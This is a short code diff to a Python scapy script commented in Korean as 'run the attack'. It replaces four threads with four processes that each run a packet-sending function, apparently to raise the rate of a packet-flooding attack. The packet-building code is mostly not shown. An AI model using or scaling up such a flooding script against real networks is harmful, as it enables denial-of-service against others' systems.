@@ -1,4 +1,4 @@
-from threading import Thread
+from multiprocessing import Process
 from scapy.all import *
 import random
 
@@ -26,13 +26,14 @@ def send_packets():
         target_packet.show()
 
 # 공격 실행
-th1 = Thread(target=send_packets)
-th2 = Thread(target=send_packets)
-th3 = Thread(target=send_packets)
-th4 = Thread(target=send_packets)
+if __name__ == '__main__':
+    th1 = Process(target=send_packets)
+    th2 = Process(target=send_packets)
+    th3 = Process(target=send_packets)
+    th4 = Process(target=send_packets)
 
-th1.start()
-th2.start()
-th3.start()
-th4.start()
+    th1.start()
+    th2.start()
+    th3.start()
+    th4.start()
 
